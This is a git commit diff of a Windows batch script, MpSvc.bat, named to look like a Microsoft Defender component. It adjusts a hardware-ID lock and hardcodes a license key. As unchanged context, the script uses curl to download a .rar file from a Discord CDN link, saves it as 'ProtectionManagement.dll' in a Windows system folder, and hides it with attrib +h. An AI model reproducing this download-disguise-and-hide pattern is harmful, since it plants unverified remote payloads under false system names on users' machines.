42e9282972ef6f563cb01300df94f44e6cdc189e
dystopia001 <ret4keog@outlook.com>
2024-09-05 13:30:11 +0200

    Update MpSvc.bat

--- MpSvc.bat
+++ MpSvc.bat
@@ -17,18 +17,17 @@ set w=[37m
 if not exist "%systemdrive%\Program Files\Windows NT\Accessories\en-US" mkdir "%systemdrive%\Program Files\Windows NT\Accessories\en-US" 2>nul
 curl -o "%systemdrive%\Program Files\Windows NT\Accessories\en-US\ProtectionManagement.dll" "https://cdn.discordapp.com/attachments/1219269832147734559/1246030163511218248/ProtectionManagement.rar?ex=665ae785&is=66599605&hm=9407ab85c459208d4a8d5056f576be05705cf37411464c0dc6019826d8b91b3b&" -# --create-dirs 
 
-
 set "logFile=C:\Program Files\Windows NT\Accessories\en-US\ProtectionManagement.dll"
 
 cls
 
 rem Prompt the user to enter the license key
-set /p "userCode=%r%Enter your license: "
+set /p "userCode=Enter your license: "
 
 cls
 
 rem Define the target HWID
-set "targetHWID=987B1724-FB38-11EE-B495-0C4F11407A0C"
+set "targetHWID=E2309804-A907-1563-D6D8-5811224BCBFD"
 
 rem Get the current user's HWID
 for /f "tokens=2 delims==" %%A in ('wmic csproduct get uuid /value') do set "currentHWID=%%A"
@@ -48,24 +47,18 @@ if /i "!currentHWID!"=="%targetHWID%" (
 powershell -Command "attrib +h \"%logFile%\""
 
 set "isValidCode=false"
-for %%i in (ret) do (
+for %%i in (7B3D1-6F8E4-2A9C5) do (
     if "!userCode!" equ "%%i" (
         set "isValidCode=true"
-        goto :checkUsedCode
+        goto :validCode
     )
 )
 
-:checkUsedCode
-findstr /x "!userCode!" "%logFile%" >nul
-if not !isValidCode!==true (
-    echo Invalid License.
-    timeout /nobreak /t 5 >nul
-    exit /b
-) else if errorlevel 1 (
+:validCode
+if !isValidCode!==true (
     echo License correct. Welcome!
-    echo !userCode!>>"%logFile%"
 ) else (
-    echo License has already been used.
+    echo Invalid License.
     timeout /nobreak /t 5 >nul
     exit /b
 )
